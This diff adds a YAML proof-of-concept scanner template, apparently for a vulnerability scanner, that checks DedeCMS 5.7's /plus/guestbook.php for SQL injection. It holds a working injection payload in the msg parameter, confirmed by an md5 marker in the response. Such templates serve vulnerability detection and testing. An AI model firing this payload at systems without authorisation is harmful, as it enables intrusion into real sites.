@@ -1,0 +1,37 @@
+detail:
+  Affected Version: '5.7'
+  author: harris2015(https://github.com/harris2015)
+  links:
+  - https://blog.csdn.net/god_7z1/article/details/8180454
+expression: r0() && r1() && r2()
+manual: true
+name: poc-yaml-dedecms-guestbook-sqli
+rules:
+  r0:
+    expression: response.status == 200
+    output:
+      articleid: search["articleid"]
+      search: '"action=admin&id=(?P<articleid>\\d{1,20})".bsubmatch(response.body)'
+    request:
+      cache: true
+      follow_redirects: true
+      method: GET
+      path: /plus/guestbook.php
+  r1:
+    expression: response.status == 200
+    request:
+      cache: true
+      follow_redirects: true
+      method: GET
+      path: /plus/guestbook.php?action=admin&job=editok&id={{articleid}}&msg=',msg=@`'`,msg=(selecT
+        md5({{r}})),email='
+  r2:
+    expression: response.status == 200 && response.body.bcontains(bytes(md5(string(r))))
+    request:
+      cache: true
+      follow_redirects: true
+      method: GET
+      path: /plus/guestbook.php
+set:
+  r: randomInt(800000000, 1000000000)
+transport: http
